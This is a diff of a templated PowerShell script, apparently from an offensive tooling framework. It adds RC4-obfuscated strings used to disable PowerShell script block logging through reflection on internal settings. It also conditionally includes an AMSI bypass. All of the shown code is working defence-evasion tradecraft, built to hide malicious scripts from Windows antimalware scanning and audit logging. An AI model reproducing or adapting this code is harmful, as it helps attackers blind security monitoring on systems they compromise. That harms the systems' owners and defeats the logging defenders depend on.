@@ -14,12 +14,26 @@ function {{symbol_name("Decrypt-String")}} {
     $result
 }
 
+{% set strings = [
+    "Bypass.AMSI",
+    "System.Management.Automation.Utils",
+    "cachedGroupPolicySettings",
+    "NonPublic,Static",
+    "HKEY_LOCAL_MACHINE\\Software\\Policies\\Microsoft\\Windows\\PowerShell\\ScriptBlockLogging",
+    "EnableScriptBlockLogging",
+    "Failed to disable AMSI, aborting",
+]%}
+
 {% for s in strings %}
-$string{{loop.index}} = {{symbol_name("Decrypt-String")}} "{{s}}"
+    $string{{loop.index}} = {{symbol_name("Decrypt-String")}} "{{s|rc4encrypt}}"
 {% endfor %}
 
+
+
 if ($PSVersionTable.PSVersion.Major -ge 5) {
-    {% include "powershell/am0nsec-amsi-bypass.ps1" %}
+    {% if amsibypass == 'am0nsec' %}
+        {% include "powershell/am0nsec-amsi-bypass.ps1" %}
+    {% endif %}
 
     {# Disable Logging #}
     $settings = [Ref].Assembly.GetType($string2).GetField($string3,$string4).GetValue($null);
